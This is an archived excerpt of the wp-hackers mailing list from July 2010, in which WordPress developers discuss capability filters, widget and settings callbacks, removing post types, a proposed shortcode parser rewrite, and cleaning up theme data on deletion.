References: <AANLkTimgkw1hy0a5V9k19CzxeKsnkvPvTWLMWmaOvyEF@mail.gmail.com> 
	<AANLkTimQ35oqjWLKQW1aow4Eg7rWQ_SdFi==Nnn7p5q9@mail.gmail.com> 
	<AANLkTin-QiuzdC2M1-UUB92FbdHCWKLjq4=ywKbaqmtT@mail.gmail.com> 
	<2800CA70-4234-4448-8230-9723EC7718FB@ftwr.co.uk>
	<AANLkTi=JefbxKzkH53Gh3dTVRYpYpJJ6NArL729kR=aq@mail.gmail.com> 
	<AANLkTiktBamO2yo5Jvf2uhoO-i3pbJQMNefeoC-Xb6-c@mail.gmail.com> 
	<AANLkTi=kgJT1gOp6NQQTjWHD4uxFzWBeJNaZRcbCDkHn@mail.gmail.com> 
	<AANLkTikC66sMBD==Bj0HW18FTmTEWDoD60dnwMD2jTTP@mail.gmail.com> 
	<AANLkTik4MMFF03JykpURNmYAYtqRDbQeBjrn-tRz=wBy@mail.gmail.com> 
	<AANLkTi=G9SGFFhpSm2Me5nkNzS9pD3NkP14AJ821mevG@mail.gmail.com> 
	<AANLkTinf0d=uUTnLwnqSEyAkwdFtMFwBqj5vRgFdbYQa@mail.gmail.com> 
	<AANLkTikbmEVD822cUZYo0=qcVY5Jg0gn4DBM1kwSKpun@mail.gmail.com> 
	<AANLkTik_EAcznJtuUXyD29W=dP0x0E8zqGm3SDczQHWV@mail.gmail.com> 
	<AANLkTinQzN5Ji57AzYSO7NS1G42zdWRGjq8cqQeeQH2Z@mail.gmail.com>
Message-ID: <AANLkTikqeqgrxRLKZ7roS1QQ6piELTE4_Y3WFri6HSw-@mail.gmail.com>

On Wed, Jul 28, 2010 at 1:26 PM, Ryan Bilesky <rbilesky at gmail.com> wrote:
> Perfect, I tested it and it is now working.
>
> http://pastebin.com/0VnVgktV

On Wed, Jul 28, 2010 at 1:07 PM, Michael D Adams <mda at blogwaffe.com> wrote:
> 3. The cap you want is passed as the first element of the third
> parameter, not the second parameter. ?The second parameter is an array
> of capabilities WordPress has decided the user must have for the
> current_user_can() or has_cap() check to pass.

In your pastebin you have: $allcaps[$cap[0]] = true; (and
$allcaps[$cap[0]] = false;).

The second parameter passed to the filter ($cap in your code) can be
an array of most anything, especially if other plugins get into the
mix.

So $cap[0] isn't guaranteed to be the cap you're looking for.  Stick
to $args[0] as you did in the switch.

From dan at dansmart.co.uk  Thu Jul 29 07:52:20 2010
From: dan at dansmart.co.uk (Dan Smart)
Date: Thu, 29 Jul 2010 08:52:20 +0100
Subject: [wp-hackers] Best format for regularly updated data
In-Reply-To: <CE68B1B9-68D1-4A63-BF81-2785E6FF7F87@ftwr.co.uk>
References: <AANLkTimgkw1hy0a5V9k19CzxeKsnkvPvTWLMWmaOvyEF@mail.gmail.com>	<AANLkTimQ35oqjWLKQW1aow4Eg7rWQ_SdFi==Nnn7p5q9@mail.gmail.com>	<AANLkTin-QiuzdC2M1-UUB92FbdHCWKLjq4=ywKbaqmtT@mail.gmail.com>	<2800CA70-4234-4448-8230-9723EC7718FB@ftwr.co.uk>	<AANLkTi=JefbxKzkH53Gh3dTVRYpYpJJ6NArL729kR=aq@mail.gmail.com>	<005801cb2e27$a21ea270$e65be750$@co.uk>	<3E70F50F-DCD6-48E7-9C08-7E95812041CF@newclarity.net>	<007401cb2e40$718928b0$549b7a10$@co.uk>
	<CE68B1B9-68D1-4A63-BF81-2785E6FF7F87@ftwr.co.uk>
Message-ID: <011201cb2ef2$f9bc6d70$ed354850$@co.uk>

Thanks Mike and Peter for your quick and helpful responses. I'm much happier
with this approach rather than reinventing the wheel. Once done, I'll
probably blog about my experiences with it so that it can be useful to
others.

Best,

Dan

----------------------------------------------------------------------------
---------
Dan Smart - Freelance Web Developer
Web: www.dansmart.co.uk
Follow me at: www.twitter.com/danielsmart


-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Peter Westwood
Sent: 28 July 2010 18:14
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Best format for regularly updated data


On 28 Jul 2010, at 11:34, Dan Smart wrote:

> Ok to do that I'll have to maintain a cross-referenced list of courses to
> post ids, and add new courses / delete them where necessary, but that
sounds
> maintainable.

You should easily be able to do this with a piece of post_meta to identify
which is which.

-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5

_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers


From ben at thewhiteroom.net  Thu Jul 29 12:06:30 2010
From: ben at thewhiteroom.net (Ben Huson)
Date: Thu, 29 Jul 2010 13:06:30 +0100
Subject: [wp-hackers] get_column_headers filter help
Message-ID: <AANLkTimk5gt8K=t3XuX=BcEDpgb-B97Fhymrbt0nk0=F@mail.gmail.com>

I am trying to filter the output of register_column_headers and
content for a plugin (not mine).

I was using the manage_xxxxx_columns filter correctly but for some
reason columns weren't being added.

I checked the core WordPress code of wp-admin/includes/template.php
and found the following code:

// Store in static to avoid running filters on each call
if ( isset($_wp_column_headers[$screen->id]) ) {
	return $_wp_column_headers[$screen->id];

This seems to prevent the filter from running for the $screen->id I
was using to add columns - a custom screen id for the plugin.

Does the plugin have to provide a way to filter the columns before
using register_column_headers() or is this something that can be
handled with the core manage_xxxxx_columns filter?

Thanks

- Ben

From matt at mattjacob.com  Thu Jul 29 14:43:20 2010
From: matt at mattjacob.com (Matt Jacob)
Date: Thu, 29 Jul 2010 07:43:20 -0700
Subject: [wp-hackers] register_setting firing callback when widget is added?!
Message-ID: <4C519388.4050508@mattjacob.com>

This is probably the most bizarre WP issue I've come across in a long 
time, so I apologize if it's difficult to make sense of what I'm talking 
about. I'll do my best to describe the problem clearly, though.

I have a method that gets hooked into admin_init, like so:

> add_action('admin_init', array($this, 'initialize_admin'));

> public function initialize_admin() {
>     register_setting('my_group', 'my_name', array($this, 'validate_options_page'));
> }

Group and option names were changed to make the code shorter.

I also have a widget that my plugin provides. When I drag that widget 
into an available widget area, I get a PHP fatal error about trying to 
use an object as an array. (I store my plugin's settings in an object 
and save it as a single option in the DB.)

I've tracked the error down to inside my validate_options_page method. 
The question, then, is: why the heck is my validation callback firing 
when activating my widget?

I'm thoroughly and legitimately stumped here. I'm hoping someone else 
has some good insights into this problem.

Matt

From wp at andrewnacin.com  Thu Jul 29 14:49:45 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Thu, 29 Jul 2010 10:49:45 -0400
Subject: [wp-hackers] register_setting firing callback when widget is
	added?!
In-Reply-To: <4C519388.4050508@mattjacob.com>
References: <4C519388.4050508@mattjacob.com>
Message-ID: <AANLkTimR5gdagnemPaxS5q7cry6QM6DCyBNM7M7+KtN6@mail.gmail.com>

On Thu, Jul 29, 2010 at 10:43 AM, Matt Jacob <matt at mattjacob.com> wrote:

> This is probably the most bizarre WP issue I've come across in a long time,
> so I apologize if it's difficult to make sense of what I'm talking about.
> I'll do my best to describe the problem clearly, though.
>
> I have a method that gets hooked into admin_init, like so:
>
>  add_action('admin_init', array($this, 'initialize_admin'));
>>
>
>  public function initialize_admin() {
>>    register_setting('my_group', 'my_name', array($this,
>> 'validate_options_page'));
>> }
>>
>
> Group and option names were changed to make the code shorter.
>
> I also have a widget that my plugin provides. When I drag that widget into
> an available widget area, I get a PHP fatal error about trying to use an
> object as an array. (I store my plugin's settings in an object and save it
> as a single option in the DB.)
>
> I've tracked the error down to inside my validate_options_page method. The
> question, then, is: why the heck is my validation callback firing when
> activating my widget?
>
> I'm thoroughly and legitimately stumped here. I'm hoping someone else has
> some good insights into this problem.
>

I think we'd have to see the code to know what's really going on, something
you might be missing.. But it may help to understand how
register_setting()'s sanitization callbacks work. It simply hooks the
callback to the sanitize_option_$option filter, thus if you are calling
update_option( 'my_name', ... ) on your own, you're also triggering your
callback.

From matt at mattjacob.com  Thu Jul 29 14:59:57 2010
From: matt at mattjacob.com (Matt Jacob)
Date: Thu, 29 Jul 2010 07:59:57 -0700
Subject: [wp-hackers] register_setting firing callback when widget is
 added?!
In-Reply-To: <AANLkTimR5gdagnemPaxS5q7cry6QM6DCyBNM7M7+KtN6@mail.gmail.com>
References: <4C519388.4050508@mattjacob.com>
	<AANLkTimR5gdagnemPaxS5q7cry6QM6DCyBNM7M7+KtN6@mail.gmail.com>
Message-ID: <4C51976D.9000603@mattjacob.com>

On 7/29/10 7:49 AM, Andrew Nacin wrote:
> you might be missing.. But it may help to understand how
> register_setting()'s sanitization callbacks work. It simply hooks the
> callback to the sanitize_option_$option filter, thus if you are calling
> update_option( 'my_name', ... ) on your own, you're also triggering your
> callback.

Actually, that is helpful to know. My callback for 
wp_register_widget_control does an update_option when the widget is 
submitted, so that explains it. I can check whether the argument to the 
validation callback is an array or an object and work around the problem 
that way.

But now I'm wondering why the widget is submitted immediately after 
adding it. That seems... unnecessary?

Matt

From otto at ottodestruct.com  Thu Jul 29 15:35:29 2010
From: otto at ottodestruct.com (Otto)
Date: Thu, 29 Jul 2010 10:35:29 -0500
Subject: [wp-hackers] register_setting firing callback when widget is
	added?!
In-Reply-To: <4C51976D.9000603@mattjacob.com>
References: <4C519388.4050508@mattjacob.com>
	<AANLkTimR5gdagnemPaxS5q7cry6QM6DCyBNM7M7+KtN6@mail.gmail.com> 
	<4C51976D.9000603@mattjacob.com>
Message-ID: <AANLkTimKAVcwea9vd8PgnJMGa5rsrhptKEagJh_gQiuw@mail.gmail.com>

On Thu, Jul 29, 2010 at 9:59 AM, Matt Jacob <matt at mattjacob.com> wrote:
> On 7/29/10 7:49 AM, Andrew Nacin wrote:
>>
>> you might be missing.. But it may help to understand how
>> register_setting()'s sanitization callbacks work. It simply hooks the
>> callback to the sanitize_option_$option filter, thus if you are calling
>> update_option( 'my_name', ... ) on your own, you're also triggering your
>> callback.
>
> Actually, that is helpful to know. My callback for
> wp_register_widget_control does an update_option when the widget is
> submitted, so that explains it. I can check whether the argument to the
> validation callback is an array or an object and work around the problem
> that way.
>
> But now I'm wondering why the widget is submitted immediately after adding
> it. That seems... unnecessary?
>

Adding a widget triggers an AJAX to set the widget up in the tables
and to set up the default options. So a submit has to occur to do
these things.

From spencer.gurnk at gmail.com  Thu Jul 29 17:02:40 2010
From: spencer.gurnk at gmail.com (Spencer)
Date: Thu, 29 Jul 2010 13:02:40 -0400
Subject: [wp-hackers] Removing a Post Type Completely
Message-ID: <AANLkTim7kJjJ_6h3t9C-N_tNHQfev58OfvpUQPM-Aw9+@mail.gmail.com>

Is there a proper way of completely removing a post type? I have

	if( isset( $wp_post_types[ 'post' ] ) )
		unset( $wp_post_types[ 'post'] );

which seems to remove the support, but the menu still shows the links
for posts, so I have to unset the menu item with the 'admin_menu'
action. After that, I register the new post type.

Is there a better way? I couldn't find a remove_post_type() function,
or anything similar. Just remove_post_type_support() to remove certain
aspects of it.

From scribu at gmail.com  Thu Jul 29 21:42:28 2010
From: scribu at gmail.com (scribu)
Date: Fri, 30 Jul 2010 00:42:28 +0300
Subject: [wp-hackers] Shortcodes
In-Reply-To: <AANLkTinxq_=POAFDu9LcyO0ey_0uZFUM-Rz0PCXCEp4h@mail.gmail.com>
References: <AANLkTinxq_=POAFDu9LcyO0ey_0uZFUM-Rz0PCXCEp4h@mail.gmail.com>
Message-ID: <AANLkTinVU_8Z_-IOuJO7UPMmlBHgzC9DcdGmCxmFf4KH@mail.gmail.com>

This looks like a big step forward.

I think you should open a ticket on trac with your imppementation as a
patch, so we can discuss specifics.

On Tuesday, July 27, 2010, Jacob Beauregard <deadowlsurvivor at gmail.com> wrote:
> I wrote my own implementation of shortcodes. It does things a bit
> differently, has nested evaluation, and allows self-nesting. Since
> there are some significant differences to the existing implementation,
> I thought I'd post here to discuss them before trying to convince
> anyone to use my implementation. A lot of the changes are borrowed
> from definitions in the HTML specification (particularly name and
> attribute matching). The following are the comments at the top of my
> shortcode file. I tried to keep track of all the differences (and
> questions) there. If you reply to this, CC me for a more prompt
> response since I'm currently on digest.
>
> From Test Cases
> (http://svn.automattic.com/wordpress-tests/wp-testcase/test_shortcode.php)
> ==========================================================================================
> Shortcode Statuses (to implement, or not to implement?)
> ??????? enabled = the shortcode works as normal (default)
> ??????? strip = the shortcode will be parsed and removed.? e.g.
> '[shortcode foo="bar"]' produces ''.? '[shortcode]foo[/shortcode]'
> produces 'foo'.
> ??????? faux = the shortcode will be abbreviated.? e.g. '[shortcode
> foo="bar"]' products '[shortcode]'.? '[shortocde]foo[/shortcode]'
> produces '[shortcode]'
> ??????? disabled = the shortcode is not parsed at all.? e.g.
> '[shortcode foo="bar"]' products '[shortcode foo="bar"]'
>
>
> Major Differences/Improvements:
> ===============================
> I. Addressing http://codex.wordpress.org/Shortcode_API#Limitations
>
>  ? ? ? ?1. You can nest any tag at any depth regardless of ancestors
> (Ticket #10702)
>
>  ? ? ? ?2. Tag and attribute names may match
> /[A-Za-z][-A-Za-z0-9_:.]*//* (trialing /* because that comment ends),
>  ? ? ? ? ? with case-insensitive interpretation
>
>  ? ? ? ?3. Interpretation doesn't get tripped up by things like hyphens
>
> II. Addressing Ticket #12760,
>
>  ? ? ? ?1. Changed from fix in #6518
>  ? ? ? ? ? Reasoning: balancing double-square-brackets can have
> misleading results with nesting
>
>  ? ? ? ?2. Shortcodes escapable by using [[, ]]
>
>  ? ? ? ?3. ']]' is escaped "right to left", so '[shortcode]]]' would
> evaluate to 'result]'
>
>  ? ? ? ?4. '[[' is escaped left to right '[[[shortcode]]]' => '[result]'
>
> III. Enhancements
>
>  ? ? ? ?1. Only matches valid shortcode for registered hooks,
> everything else will appear as text
>
>  ? ? ? ?2. Can register multiple hooks to single shortcode, uses
> priority (default: 10)
>
> IV. Conflicting Design Changes
>
>  ? ? ? ?1. Quoted literals are escaped by entities rather than cslashes
>
>  ? ? ? ?2. Inline (self-closing) shortcodes get passed content to
> accomodate multiple callbacks
>
>  ? ? ? ?3. No equivalent to shortcode_parse_atts function
>  ? ? ? ? ? (Not marked private in function reference, but not
> documented in shortcode API page)
>
>  ? ? ? ?4. Boolean attributes take the place of positional attributes
>  ? ? ? ? ? [foo bar] gets attributes array('bar' => 'bar') instead of
> array('0' => 'bar')
>
>  ? ? ? ?5. Disallows attribute and tag names that don't match
> /[A-Za-z][-A-Za-z0-9_:.]*/
>
>  ? ? ? ?6. Disallows unquoted attribute values (also boolean
> attributes), unless they match /[-A-Za-z0-9_:.]+/
>
>
> Basic Interpretation Method:
> ============================
> 1. If an open tag is encountered, it is added to the stack
>
> 2. If a close tag is encountered and there is no matching open tag on the stack
>  ? the close tag is ignored
>
> 3. If a close tag is encountered and there is a matching open tag on the stack
>  ? all opened tags on the stack before the matched tag will be
> implicitly self-closed
>
> 4. If text or an inline tag is encountered, it will be evaluated to its parent's
>  ? content immediately
>
> 5. If tags are not closed by the end of the interpretation, they will
> be implicitly
>  ? self-closed
>
>
> Issues:
> =======
> 1. Haven't written new unit tests to reflect new functionality added,
> functionality differences
>
> 2. Documentation is not as good (though I hope most of the code is
> self-explanatory)
>
> 3. Not 100% backwards compatible
>
> ---
> I look forward to hearing this list's opinions.
> -Jacob Beauregard
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

-- 
http://scribu.net

From aaron at xavisys.com  Thu Jul 29 22:13:33 2010
From: aaron at xavisys.com (Aaron D. Campbell)
Date: Thu, 29 Jul 2010 15:13:33 -0700
Subject: [wp-hackers] Shortcodes
In-Reply-To: <AANLkTinxq_=POAFDu9LcyO0ey_0uZFUM-Rz0PCXCEp4h@mail.gmail.com>
References: <AANLkTinxq_=POAFDu9LcyO0ey_0uZFUM-Rz0PCXCEp4h@mail.gmail.com>
Message-ID: <4C51FD0D.6030406@xavisys.com>

  Honestly it sounds great.  Can we see the code?  How does it perform 
with long posts or sites with lots of registered shortcodes (I run 
against #8553 <http://core.trac.wordpress.org/ticket/8553> fairly often)?

On 7/27/2010 12:40 PM, Jacob Beauregard wrote:
> I wrote my own implementation of shortcodes. It does things a bit
> differently, has nested evaluation, and allows self-nesting. Since
> there are some significant differences to the existing implementation,
> I thought I'd post here to discuss them before trying to convince
> anyone to use my implementation. A lot of the changes are borrowed
> from definitions in the HTML specification (particularly name and
> attribute matching). The following are the comments at the top of my
> shortcode file. I tried to keep track of all the differences (and
> questions) there. If you reply to this, CC me for a more prompt
> response since I'm currently on digest.
>
>  From Test Cases
> (http://svn.automattic.com/wordpress-tests/wp-testcase/test_shortcode.php)
> ==========================================================================================
> Shortcode Statuses (to implement, or not to implement?)
>          enabled = the shortcode works as normal (default)
>          strip = the shortcode will be parsed and removed.  e.g.
> '[shortcode foo="bar"]' produces ''.  '[shortcode]foo[/shortcode]'
> produces 'foo'.
>          faux = the shortcode will be abbreviated.  e.g. '[shortcode
> foo="bar"]' products '[shortcode]'.  '[shortocde]foo[/shortcode]'
> produces '[shortcode]'
>          disabled = the shortcode is not parsed at all.  e.g.
> '[shortcode foo="bar"]' products '[shortcode foo="bar"]'
>
>
> Major Differences/Improvements:
> ===============================
> I. Addressing http://codex.wordpress.org/Shortcode_API#Limitations
>
>          1. You can nest any tag at any depth regardless of ancestors
> (Ticket #10702)
>
>          2. Tag and attribute names may match
> /[A-Za-z][-A-Za-z0-9_:.]*//* (trialing /* because that comment ends),
>             with case-insensitive interpretation
>
>          3. Interpretation doesn't get tripped up by things like hyphens
>
> II. Addressing Ticket #12760,
>
>          1. Changed from fix in #6518
>             Reasoning: balancing double-square-brackets can have
> misleading results with nesting
>
>          2. Shortcodes escapable by using [[, ]]
>
>          3. ']]' is escaped "right to left", so '[shortcode]]]' would
> evaluate to 'result]'
>
>          4. '[[' is escaped left to right '[[[shortcode]]]' =>  '[result]'
>
> III. Enhancements
>
>          1. Only matches valid shortcode for registered hooks,
> everything else will appear as text
>
>          2. Can register multiple hooks to single shortcode, uses
> priority (default: 10)
>
> IV. Conflicting Design Changes
>
>          1. Quoted literals are escaped by entities rather than cslashes
>
>          2. Inline (self-closing) shortcodes get passed content to
> accomodate multiple callbacks
>
>          3. No equivalent to shortcode_parse_atts function
>             (Not marked private in function reference, but not
> documented in shortcode API page)
>
>          4. Boolean attributes take the place of positional attributes
>             [foo bar] gets attributes array('bar' =>  'bar') instead of
> array('0' =>  'bar')
>
>          5. Disallows attribute and tag names that don't match
> /[A-Za-z][-A-Za-z0-9_:.]*/
>
>          6. Disallows unquoted attribute values (also boolean
> attributes), unless they match /[-A-Za-z0-9_:.]+/
>
>
> Basic Interpretation Method:
> ============================
> 1. If an open tag is encountered, it is added to the stack
>
> 2. If a close tag is encountered and there is no matching open tag on the stack
>     the close tag is ignored
>
> 3. If a close tag is encountered and there is a matching open tag on the stack
>     all opened tags on the stack before the matched tag will be
> implicitly self-closed
>
> 4. If text or an inline tag is encountered, it will be evaluated to its parent's
>     content immediately
>
> 5. If tags are not closed by the end of the interpretation, they will
> be implicitly
>     self-closed
>
>
> Issues:
> =======
> 1. Haven't written new unit tests to reflect new functionality added,
> functionality differences
>
> 2. Documentation is not as good (though I hope most of the code is
> self-explanatory)
>
> 3. Not 100% backwards compatible
>
> ---
> I look forward to hearing this list's opinions.
> -Jacob Beauregard

From deadowlsurvivor at gmail.com  Fri Jul 30 03:08:25 2010
From: deadowlsurvivor at gmail.com (Jacob Beauregard)
Date: Thu, 29 Jul 2010 23:08:25 -0400
Subject: [wp-hackers] Shortcodes
Message-ID: <AANLkTimeNnL5urkjuL9LL7svN2grmo8WqTmNHh0kKBB_@mail.gmail.com>

> Message: 7
> Date: Fri, 30 Jul 2010 00:42:28 +0300
> From: scribu <scribu at gmail.com>
> Subject: Re: [wp-hackers] Shortcodes
> To: "wp-hackers at lists.automattic.com"
> ? ? ? ?<wp-hackers at lists.automattic.com>
> Message-ID:
> ? ? ? ?<AANLkTinVU_8Z_-IOuJO7UPMmlBHgzC9DcdGmCxmFf4KH at mail.gmail.com>
> Content-Type: text/plain; charset=UTF-8
>
> This looks like a big step forward.
>
> I think you should open a ticket on trac with your imppementation as a
> patch, so we can discuss specifics.

Will try to get to that tomorrow.

> Message: 8
> Date: Thu, 29 Jul 2010 15:13:33 -0700
> From: "Aaron D. Campbell" <aaron at xavisys.com>
> Subject: Re: [wp-hackers] Shortcodes
> To: wp-hackers at lists.automattic.com
> Message-ID: <4C51FD0D.6030406 at xavisys.com>
> Content-Type: text/plain; charset=ISO-8859-1; format=flowed
>
> ?Honestly it sounds great. ?Can we see the code? ?How does it perform
> with long posts or sites with lots of registered shortcodes (I run
> against #8553 <http://core.trac.wordpress.org/ticket/8553> fairly often)?

To be honest, I haven't tried against longer posts or in a production
environment. However, I plan to use shortcodes in an upcoming large
project at work and I wasn't satisfied with the current
implementation. I don't expect backtracking to be a big issue as much
as I do the regex being quite a bit longer.

For sites with lots of registered shortcodes, it uses the same kind of
alternation trick for many shortcode names as the current
implementation does. If that is currently impacting the efficiency of
the regexp, it can be easily modified to use just a regular name
expression and swallow or spit shortcodes that weren't registered
after parsing.

One thing to note is that this is not context free, and the deeper
levels of context are included in the upper level regexps. They are
then evaluated again to get the parse subexpressions (and so on) once
the upper-expressions are matched, so there's a bit of repetition
going on there. There's an easy way out of it that would be minimizing
context depth. I don't know how much it will impact performance, but
otherwise regular expressions won't do much good for context-based
parsing.

As for the source, there are many smaller functions rather than a few
longer ones which I expect will make it easier to work with.

From jayarjo at gmail.com  Fri Jul 30 10:02:45 2010
From: jayarjo at gmail.com (Davit Barbakadze)
Date: Fri, 30 Jul 2010 14:02:45 +0400
Subject: [wp-hackers]  any way to clean after theme when it gets deleted?
Message-ID: <AANLkTikbsmp5JJ9bwePbZ_Tgpv8bWj9i1c9OFKNAFdkA@mail.gmail.com>

I think everyone uses options and maybe even tables in their themes
nowadays. Is there any way coder can clean up after theme - delete
options, remove tables - when it get's uninstalled. Something similar
to what we have for plugins?

-- 
Davit Barbakadze

From diana.j.wiadji at hotmail.com  Fri Jul 30 11:14:15 2010
From: diana.j.wiadji at hotmail.com (diana.j.wiadji at hotmail.com)
Date: Fri, 30 Jul 2010 11:14:15 +0000
Subject: [wp-hackers] any way to clean after theme when it gets deleted?
Message-ID: <1392738174-1280488446-cardhu_decombobulator_blackberry.rim.net-16166662-@bda007.bisx.prodap.on.blackberry>

$
------Original Message------
From: Davit Barbakadze
Sender: wp-hackers-bounces at lists.automattic.com
To: wp-hackers at lists.automattic.com
ReplyTo: wp-hackers at lists.automattic.com
Subject: [wp-hackers]  any way to clean after theme when it gets deleted?
Sent: Jul 30, 2010 18:02

I think everyone uses options and maybe even tables in their themes
nowadays. Is there any way coder can clean up after theme - delete
options, remove tables - when it get's uninstalled. Something similar
to what we have for plugins?

-- 
Davit Barbakadze
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers



Sent from my BlackBerry? smartphone on 3

From ashishsainiashfame at gmail.com  Fri Jul 30 11:45:27 2010
From: ashishsainiashfame at gmail.com (Ashish Saini)
Date: Fri, 30 Jul 2010 17:15:27 +0530
Subject: [wp-hackers] any way to clean after theme when it gets deleted?
In-Reply-To: <1392738174-1280488446-cardhu_decombobulator_blackberry.rim.net-16166662-@bda007.bisx.prodap.on.blackberry>
References: <1392738174-1280488446-cardhu_decombobulator_blackberry.rim.net-16166662-@bda007.bisx.prodap.on.blackberry>
Message-ID: <AANLkTimqn9O=T4Cjg5CHcbZaHzKgstxH2VO+Pw-Kf9zA@mail.gmail.com>

Hi Davit,

I think a better option would be to provide uninstall function as leaving
the options in the database makes sense as the user may switch back and so
it will save the pain of configuring it.

Thanks & Regards
Ashish Saini aka Ashfame
(Deserve Before You Desire)
Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com | Twitter
: http://twitter.com/ashfame


On Fri, Jul 30, 2010 at 4:44 PM, <diana.j.wiadji at hotmail.com> wrote:

> $
> ------Original Message------
> From: Davit Barbakadze
> Sender: wp-hackers-bounces at lists.automattic.com
> To: wp-hackers at lists.automattic.com
> ReplyTo: wp-hackers at lists.automattic.com
> Subject: [wp-hackers]  any way to clean after theme when it gets deleted?
> Sent: Jul 30, 2010 18:02
>
> I think everyone uses options and maybe even tables in their themes
> nowadays. Is there any way coder can clean up after theme - delete
> options, remove tables - when it get's uninstalled. Something similar
> to what we have for plugins?
>
> --
> Davit Barbakadze
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>
>
> Sent from my BlackBerry? smartphone on 3
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From jayarjo at gmail.com  Fri Jul 30 13:17:51 2010
From: jayarjo at gmail.com (Davit Barbakadze)
Date: Fri, 30 Jul 2010 17:17:51 +0400
Subject: [wp-hackers] any way to clean after theme when it gets deleted?
In-Reply-To: <AANLkTimqn9O=T4Cjg5CHcbZaHzKgstxH2VO+Pw-Kf9zA@mail.gmail.com>
References: <1392738174-1280488446-cardhu_decombobulator_blackberry.rim.net-16166662-@bda007.bisx.prodap.on.blackberry>
	<AANLkTimqn9O=T4Cjg5CHcbZaHzKgstxH2VO+Pw-Kf9zA@mail.gmail.com>
Message-ID: <AANLkTikhpSNdc-VtaLnOU2py=b+90tFjpCFLZeW+ecS6@mail.gmail.com>

It's not about switching (activate/deactivate), but deleting. It would
be pretty logical to remove all the stuff that theme has created on
activation.

On Fri, Jul 30, 2010 at 3:45 PM, Ashish Saini
<ashishsainiashfame at gmail.com> wrote:
> Hi Davit,
>
> I think a better option would be to provide uninstall function as leaving
> the options in the database makes sense as the user may switch back and so
> it will save the pain of configuring it.
>
> Thanks & Regards
> Ashish Saini aka Ashfame
> (Deserve Before You Desire)
> Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com | Twitter
> : http://twitter.com/ashfame
>
>
> On Fri, Jul 30, 2010 at 4:44 PM, <diana.j.wiadji at hotmail.com> wrote:
>
>> $
>> ------Original Message------
>> From: Davit Barbakadze
>> Sender: wp-hackers-bounces at lists.automattic.com
>> To: wp-hackers at lists.automattic.com
>> ReplyTo: wp-hackers at lists.automattic.com
>> Subject: [wp-hackers] ?any way to clean after theme when it gets deleted?
>> Sent: Jul 30, 2010 18:02
>>
>> I think everyone uses options and maybe even tables in their themes
>> nowadays. Is there any way coder can clean up after theme - delete
>> options, remove tables - when it get's uninstalled. Something similar
>> to what we have for plugins?
>>
>> --
>> Davit Barbakadze
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>>
>>
>> Sent from my BlackBerry? smartphone on 3
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Davit Barbakadze

From ashishsainiashfame at gmail.com  Fri Jul 30 13:25:18 2010
From: ashishsainiashfame at gmail.com (Ashish Saini)
Date: Fri, 30 Jul 2010 18:55:18 +0530
Subject: [wp-hackers] any way to clean after theme when it gets deleted?
In-Reply-To: <AANLkTikhpSNdc-VtaLnOU2py=b+90tFjpCFLZeW+ecS6@mail.gmail.com>
References: <1392738174-1280488446-cardhu_decombobulator_blackberry.rim.net-16166662-@bda007.bisx.prodap.on.blackberry>
	<AANLkTimqn9O=T4Cjg5CHcbZaHzKgstxH2VO+Pw-Kf9zA@mail.gmail.com> 
	<AANLkTikhpSNdc-VtaLnOU2py=b+90tFjpCFLZeW+ecS6@mail.gmail.com>
Message-ID: <AANLkTikU0qcxQMMVgRwTrNOEHjXoUO_o0r44C+=_96Z+@mail.gmail.com>

You didn't get my point. I said you should provide an uninstaller function
that wipes out data and it shouldn't be automated upon deactivation.

I would hate a theme which will ask for options to be configured again when
I just switch back to another theme and now I want the previous theme back.

Thanks & Regards
Ashish Saini aka Ashfame
(Deserve Before You Desire)
Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com | Twitter
: http://twitter.com/ashfame


On Fri, Jul 30, 2010 at 6:47 PM, Davit Barbakadze <jayarjo at gmail.com> wrote:

> It's not about switching (activate/deactivate), but deleting. It would
> be pretty logical to remove all the stuff that theme has created on
> activation.
>
> On Fri, Jul 30, 2010 at 3:45 PM, Ashish Saini
> <ashishsainiashfame at gmail.com> wrote:
> > Hi Davit,
> >
> > I think a better option would be to provide uninstall function as leaving
> > the options in the database makes sense as the user may switch back and
> so
> > it will save the pain of configuring it.
> >
> > Thanks & Regards
> > Ashish Saini aka Ashfame
> > (Deserve Before You Desire)
> > Homepage : http://www.ashfame.com | Blog : http://blog.ashfame.com |
> Twitter
> > : http://twitter.com/ashfame
> >
> >
> > On Fri, Jul 30, 2010 at 4:44 PM, <diana.j.wiadji at hotmail.com> wrote:
> >
> >> $
> >> ------Original Message------
> >> From: Davit Barbakadze
> >> Sender: wp-hackers-bounces at lists.automattic.com
> >> To: wp-hackers at lists.automattic.com
> >> ReplyTo: wp-hackers at lists.automattic.com
> >> Subject: [wp-hackers]  any way to clean after theme when it gets
> deleted?
> >> Sent: Jul 30, 2010 18:02
> >>
> >> I think everyone uses options and maybe even tables in their themes
> >> nowadays. Is there any way coder can clean up after theme - delete
> >> options, remove tables - when it get's uninstalled. Something similar
> >> to what we have for plugins?
> >>
> >> --
> >> Davit Barbakadze
> >> _______________________________________________
> >> wp-hackers mailing list
> >> wp-hackers at lists.automattic.com
> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>
> >>
> >>
